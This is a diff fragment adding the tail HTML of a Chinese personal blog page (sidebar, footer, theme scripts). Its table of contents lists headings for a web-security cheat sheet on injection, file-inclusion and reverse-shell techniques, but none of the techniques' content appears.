+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf绕过"><span class="nav-number">2.1.</span> <span class="nav-text">waf绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、输入参数绕过"><span class="nav-number">2.1.1.</span> <span class="nav-text">1、输入参数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、绕过空格"><span class="nav-number">2.1.2.</span> <span class="nav-text">2、绕过空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、"><span class="nav-number">2.1.3.</span> <span class="nav-text">3、</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">2.2.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">2.2.1.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤绕过"><span class="nav-number">2.2.2.</span> <span class="nav-text">过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini"><span class="nav-number">2.2.3.</span> <span class="nav-text">.user.ini</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#短标签"><span class="nav-number">2.2.4.</span> <span class="nav-text">短标签</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python"><span class="nav-number">2.3.</span> <span class="nav-text">python</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模板攻击"><span class="nav-number">2.3.1.</span> <span class="nav-text">模板攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tornado模板泄露"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">tornado模板泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL注入"><span class="nav-number">2.4.</span> <span class="nav-text">MYSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通注入"><span class="nav-number">2.4.1.</span> <span class="nav-text">普通注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆叠注入"><span class="nav-number">2.4.2.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#宽字节注入"><span class="nav-number">2.4.3.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache漏洞"><span class="nav-number">2.5.</span> <span class="nav-text">apache漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nginx漏洞"><span class="nav-number">2.6.</span> <span class="nav-text">nginx漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows文件漏洞"><span class="nav-number">2.7.</span> <span class="nav-text">windows文件漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各类shell"><span class="nav-number">2.8.</span> <span class="nav-text">各类shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap写入shell"><span class="nav-number">2.8.1.</span> <span class="nav-text">nmap写入shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl命令执行"><span class="nav-number">2.8.2.</span> <span class="nav-text">Perl命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#条件"><span class="nav-number">2.8.2.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">2.8.2.2.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.8.3.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-Bash反弹Shell"><span class="nav-number">2.8.3.1.</span> <span class="nav-text">0x1 Bash反弹Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-telnet反弹"><span class="nav-number">2.8.3.2.</span> <span class="nav-text">0x2 telnet反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-nc-netcat-反弹"><span class="nav-number">2.8.3.3.</span> <span class="nav-text">0x2 nc (netcat)反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-Shell"><span class="nav-number">2.8.3.4.</span> <span class="nav-text">python Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl-Shell"><span class="nav-number">2.8.3.5.</span> <span class="nav-text">Perl Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ruby-Shell"><span class="nav-number">2.8.3.6.</span> <span class="nav-text">Ruby Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-Shell"><span class="nav-number">2.8.3.7.</span> <span class="nav-text">PHP Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lua-Shell"><span class="nav-number">2.8.3.8.</span> <span class="nav-text">lua Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过Shell利用"><span class="nav-number">2.8.3.9.</span> <span class="nav-text">通过Shell利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux相关知识"><span class="nav-number">2.9.</span> <span class="nav-text">Linux相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#proc相关知识"><span class="nav-number">2.9.1.</span> <span class="nav-text">proc相关知识</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="粗制乱造"
+      src="/file/avatar.png">
+  <p class="site-author-name" itemprop="name">粗制乱造</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">粗制乱造</span>
+</div>
+  <div class="powered-by">由 <a href="https://czlz.net/" class="theme-link">czlz.net</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
